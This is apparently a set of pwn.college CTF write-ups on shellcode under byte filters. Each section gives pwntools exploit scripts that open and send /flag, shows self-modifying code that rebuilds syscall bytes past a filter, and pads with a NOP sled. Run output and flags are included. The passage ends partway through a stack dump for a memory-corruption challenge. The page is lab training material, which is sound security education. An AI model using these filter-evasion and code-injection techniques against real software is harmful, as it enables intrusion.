---
custom_edit_url: null
sidebar_position: 1
---

## ello ackers!

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

```
hacker@program-security~ello-ackers:/$ /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.
```

Let's create our exploit script.

### Exploit

```py title="~/script" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea rdi, [rip + flag]
    xor esi, esi
    xor rdx, rdx
    mov rax, 2           
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov rdi, 1          
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x100
    mov rax, 40          
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60            
    syscall

flag:
    .string "/flag"
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~ello-ackers:/$ python ~/script.py | /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.

   0:   48 8d 3d 3b 00 00 00    lea    rdi, [rip+0x3b]        # 0x42
   7:   31 f6                   xor    esi, esi
   9:   48 31 d2                xor    rdx, rdx
   c:   48 c7 c0 02 00 00 00    mov    rax, 0x2
  13:   0f 05                   syscall 
  15:   48 c7 c7 01 00 00 00    mov    rdi, 0x1
  1c:   48 89 c6                mov    rsi, rax
  1f:   48 c7 c2 00 00 00 00    mov    rdx, 0x0
  26:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  2d:   48 c7 c0 28 00 00 00    mov    rax, 0x28
  34:   0f 05                   syscall 
  36:   48 31 ff                xor    rdi, rdi
  39:   48 c7 c0 3c 00 00 00    mov    rax, 0x3c
  40:   0f 05                   syscall 
  42:   2f                      (bad)  
  43:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  45:   61                      (bad)  
  46:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode have no H bytes!

Failed filter at byte 0!
```

We can see that the program requires that our shell code has no [`REX.W prefix`](https://en.wikipedia.org/wiki/REX_prefix).

```
## REX:
0100 W R X B

## REX.W:
0100 1000   =>   0x48
```

A `REX.W` prefix is used to denote when an instruction uses 64-bit operands.

#### Without `REX.W` prefix

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
    syscall

    /* exit(0) */
    xor edi, edi
    mov al, 60
    syscall

flag:
    .string "/flag" 
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~ello-ackers:/$ python ~/script.py | /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.

   0:   8d 3d 2b 00 00 00       lea    edi, [rip+0x2b]        # 0x31
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   0f 05                   syscall 
  11:   bf 01 00 00 00          mov    edi, 0x1
  16:   89 c6                   mov    esi, eax
  18:   ba 00 00 00 00          mov    edx, 0x0
  1d:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  24:   b8 28 00 00 00          mov    eax, 0x28
  29:   0f 05                   syscall 
  2b:   31 ff                   xor    edi, edi
  2d:   b0 3c                   mov    al, 0x3c
  2f:   0f 05                   syscall 
  31:   2f                      (bad)  
  32:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  34:   61                      (bad)  
  35:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000026e33000 | 8d 3d 2b 00 00 00                             | lea edi, [rip + 0x2b]
0x0000000026e33006 | 31 f6                                         | xor esi, esi
0x0000000026e33008 | 31 d2                                         | xor edx, edx
0x0000000026e3300a | b8 02 00 00 00                                | mov eax, 2
0x0000000026e3300f | 0f 05                                         | syscall 
0x0000000026e33011 | bf 01 00 00 00                                | mov edi, 1
0x0000000026e33016 | 89 c6                                         | mov esi, eax
0x0000000026e33018 | ba 00 00 00 00                                | mov edx, 0
0x0000000026e3301d | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000026e33024 | b8 28 00 00 00                                | mov eax, 0x28
0x0000000026e33029 | 0f 05                                         | syscall 
0x0000000026e3302b | 31 ff                                         | xor edi, edi
0x0000000026e3302d | b0 3c                                         | mov al, 0x3c
0x0000000026e3302f | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{Y0AomWBAdnyjKxZlzES4hSXCoU-.0FMyIDL4ITM0EzW}
```

&nbsp;

## Syscall Smuggler

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

```
hacker@program-security~syscall-smuggler:/$ /challenge/syscall-smuggler 
###
### Welcome to /challenge/syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x286d6000!
Reading 0x1000 bytes from stdin.
```

We will have to create a self-modifying shellcode which will bypass the filters.
For this, we have to create a label that has the bytes, `0x0e` and `0x04`. 

```asm showLineNumbers
sys1:
    .byte 0x0e
    .byte 0x04
```

Before this label is executed, we have to increment the byte values so that they are `0x0f` and `0x05` which is the bytecode for `syscall`.
Our modifications should look something like this:

```asm title="syscall snippet" showLineNumbers
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]

sys1:
    .byte 0x0e
    .byte 0x04
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    
    /* syscall */
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]
sys1:
    .byte 0x0e
    .byte 0x04        

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
 
    /* syscall */
    inc byte ptr [rip + sys2 + 1]
    inc byte ptr [rip + sys2]
sys2:
    .byte 0x0e
    .byte 0x04            

    /* exit(0) */
    xor edi, edi
    mov al, 60

    /* syscall */
    inc byte ptr [rip + sys3 + 1]
    inc byte ptr [rip + sys3]
sys3:
    .byte 0x0e
    .byte 0x04           

flag:
    .string "/flag" 
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~syscall-smuggler:/$ python ~/script.py | /challenge/syscall-smuggler 
###
### Welcome to /challenge/syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x286d6000!
Reading 0x1000 bytes from stdin.

   0:   8d 3d 4f 00 00 00       lea    edi, [rip+0x4f]        # 0x55
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x1c
  15:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x1b
  1b:   0e                      (bad)  
  1c:   04 bf                   add    al, 0xbf
  1e:   01 00                   add    DWORD PTR [rax], eax
  20:   00 00                   add    BYTE PTR [rax], al
  22:   89 c6                   mov    esi, eax
  24:   ba 00 00 00 00          mov    edx, 0x0
  29:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  30:   b8 28 00 00 00          mov    eax, 0x28
  35:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x42
  3b:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x41
  41:   0e                      (bad)  
  42:   04 31                   add    al, 0x31
  44:   ff b0 3c fe 05 07       push   QWORD PTR [rax+0x705fe3c]
  4a:   00 00                   add    BYTE PTR [rax], al
  4c:   00 fe                   add    dh, bh
  4e:   05 00 00 00 00          add    eax, 0x0
  53:   0e                      (bad)  
  54:   04 2f                   add    al, 0x2f
  56:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  58:   61                      (bad)  
  59:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00000000286d6000 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
0x00000000286d6006 | 31 f6                                         | xor esi, esi
0x00000000286d6008 | 31 d2                                         | xor edx, edx
0x00000000286d600a | b8 02 00 00 00                                | mov eax, 2
0x00000000286d600f | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
0x00000000286d6015 | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

pwn.college{4rDXk944HRYc-LzoHZ_apv9MDgT.0VMyIDL4ITM0EzW}
```

&nbsp;

## Syscall Shenanigans

>  Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!

```
hacker@program-security~syscall-shenanigans:/$ /challenge/syscall-shenanigans 
###
### Welcome to /challenge/syscall-shenanigans!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x2000 bytes for shellcode at 0x2b033000!
Reading 0x2000 bytes from stdin.
```

If we try the exploit from the previous challenge, we get the following message:

```
hacker@program-security~syscall-shenanigans:/$ python ~/script.py | /challenge/syscall-shenanigans 
###
### Welcome to /challenge/syscall-shenanigans!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x2000 bytes for shellcode at 0x2b033000!
Reading 0x2000 bytes from stdin.

   0:   8d 3d 4f 00 00 00       lea    edi, [rip+0x4f]        # 0x55
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x1c
  15:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x1b
  1b:   0e                      (bad)  
  1c:   04 bf                   add    al, 0xbf
  1e:   01 00                   add    DWORD PTR [rax], eax
  20:   00 00                   add    BYTE PTR [rax], al
  22:   89 c6                   mov    esi, eax
  24:   ba 00 00 00 00          mov    edx, 0x0
  29:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  30:   b8 28 00 00 00          mov    eax, 0x28
  35:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x42
  3b:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x41
  41:   0e                      (bad)  
  42:   04 31                   add    al, 0x31
  44:   ff b0 3c fe 05 07       push   QWORD PTR [rax+0x705fe3c]
  4a:   00 00                   add    BYTE PTR [rax], al
  4c:   00 fe                   add    dh, bh
  4e:   05 00 00 00 00          add    eax, 0x0
  53:   0e                      (bad)  
  54:   04 2f                   add    al, 0x2f
  56:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  58:   61                      (bad)  
  59:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000002b033000 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
0x000000002b033006 | 31 f6                                         | xor esi, esi
0x000000002b033008 | 31 d2                                         | xor edx, edx
0x000000002b03300a | b8 02 00 00 00                                | mov eax, 2
0x000000002b03300f | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
0x000000002b033015 | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

Segmentation fault
```

Since the first 4096 bytes will be non-writable, we will have to pad that range with a NOP sled.

### NOP sled

#### `nop` instruction

The `nop` instruction makes no semantic difference to the program, i.e. it does nothing to the program logic. For this reason, it can be used to pad the code.

We can repeat the `nop` instruction using a `repeat` loop.

#### `rept` instruction

The `rept` instruction creates a loop repeats which whatever instruction is mentioned within it as many times as specified.

```
.rept (number of times to be repeated)
instruction
.endr
```

Now we simply have to put our `nop` instruction inside the repeat loop and put the repeat loop between the `jmp` instruction and the label.

```
jmp Relative
.rept 4096
nop
.endr
Relative:
mov rax, 0x1
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    
    /* syscall */
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]
sys1:
    .byte 0x0e
    .byte 0x04        

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
 
    /* syscall */
    inc byte ptr [rip + sys2 + 1]
    inc byte ptr [rip + sys2]
sys2:
    .byte 0x0e
    .byte 0x04            

    /* exit(0) */
    xor edi, edi
    mov al, 60

    /* syscall */
    inc byte ptr [rip + sys3 + 1]
    inc byte ptr [rip + sys3]
sys3:
    .byte 0x0e
    .byte 0x04           

flag:
    .string "/flag" 
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~syscall-shenanigans:/$ python ~/script.py | /challenge/syscall-shenanigans 

# --- snip ---

0x000000002b034003 | 90                                            | nop 
0x000000002b034004 | 90                                            | nop 
0x000000002b034005 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
0x000000002b03400b | 31 f6                                         | xor esi, esi
0x000000002b03400d | 31 d2                                         | xor edx, edx
0x000000002b03400f | b8 02 00 00 00                                | mov eax, 2
0x000000002b034014 | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
0x000000002b03401a | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

pwn.college{ExWjiR3WDqi0KdvDkYToGHFiGhQ.0lMyIDL4ITM0EzW}
```

&nbsp;

## Login Leakage (Easy)

> Leverage memory corruption to satisfy a simple constraint

```
hacker@program-security~login-leakage-easy:/$ /challenge/login-leakage-easy 
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe0cc8fa10 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa18 (rsp+0x0008) | e8 12 c9 0c fe 7f 00 00 | 0x00007ffe0cc912e8 |
| 0x00007ffe0cc8fa20 (rsp+0x0010) | d8 12 c9 0c fe 7f 00 00 | 0x00007ffe0cc912d8 |
| 0x00007ffe0cc8fa28 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe0cc8fa30 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa38 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa40 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa48 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa50 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa58 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa60 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa68 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa70 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa78 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa80 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa88 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa90 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa98 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faa0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faa8 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fab0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fab8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fac0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fac8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fad0 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fad8 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fae0 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fae8 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faf0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faf8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb00 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb08 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb10 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb18 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb20 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb28 (rsp+0x0118) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb30 (rsp+0x0120) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb38 (rsp+0x0128) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb40 (rsp+0x0130) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb48 (rsp+0x0138) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb50 (rsp+0x0140) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb58 (rsp+0x0148) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb60 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb68 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb70 (rsp+0x0160) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb78 (rsp+0x0168) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb80 (rsp+0x0170) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb88 (rsp+0x0178) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb90 (rsp+0x0180) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb98 (rsp+0x0188) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fba0 (rsp+0x0190) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fba8 (rsp+0x0198) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbb0 (rsp+0x01a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbb8 (rsp+0x01a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbc0 (rsp+0x01b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbc8 (rsp+0x01b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbd0 (rsp+0x01c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbd8 (rsp+0x01c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbe0 (rsp+0x01d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbe8 (rsp+0x01d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbf0 (rsp+0x01e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbf8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc00 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc08 (rsp+0x01f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc10 (rsp+0x0200) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc18 (rsp+0x0208) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc20 (rsp+0x0210) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc28 (rsp+0x0218) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc30 (rsp+0x0220) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc38 (rsp+0x0228) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc40 (rsp+0x0230) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc48 (rsp+0x0238) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc50 (rsp+0x0240) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc58 (rsp+0x0248) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc60 (rsp+0x0250) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc68 (rsp+0x0258) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc70 (rsp+0x0260) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc78 (rsp+0x0268) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc80 (rsp+0x0270) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc88 (rsp+0x0278) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc90 (rsp+0x0280) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc98 (rsp+0x0288) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fca0 (rsp+0x0290) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fca8 (rsp+0x0298) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcb0 (rsp+0x02a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcb8 (rsp+0x02a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcc0 (rsp+0x02b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcc8 (rsp+0x02b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcd0 (rsp+0x02c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcd8 (rsp+0x02c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fce0 (rsp+0x02d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fce8 (rsp+0x02d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcf0 (rsp+0x02e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcf8 (rsp+0x02e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd00 (rsp+0x02f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd08 (rsp+0x02f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd10 (rsp+0x0300) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd18 (rsp+0x0308) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd20 (rsp+0x0310) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd28 (rsp+0x0318) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd30 (rsp+0x0320) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd38 (rsp+0x0328) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd40 (rsp+0x0330) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd48 (rsp+0x0338) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd50 (rsp+0x0340) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd58 (rsp+0x0348) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd60 (rsp+0x0350) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
